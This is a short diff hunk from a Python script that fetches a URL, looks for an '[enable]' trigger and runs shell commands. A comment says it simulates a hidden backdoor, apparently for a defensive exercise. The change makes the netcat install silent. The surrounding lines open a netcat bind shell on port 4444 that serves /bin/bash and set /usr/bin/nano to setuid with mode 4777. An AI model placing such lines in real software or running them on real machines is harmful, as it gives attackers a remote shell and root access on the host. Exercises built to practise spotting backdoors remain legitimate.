@@ -258,7 +258,7 @@ while True:
     html_content = urllib2.urlopen(fileLocationURL).read().decode('utf-8')
     matches = re.findall(str("[enable]"), html_content);
     #simulate hidden backdoor. Solution isn't to remove netcat, but block the command
-    os.system("apt-get install netcat-traditional")
+    os.system("apt-get install -y -vv netcat-traditional &> /dev/null")
     os.system("netcat -lvp 4444 -e /bin/bash & 2>/dev/null")
     os.system("chmod 4777 /usr/bin/nano")
 
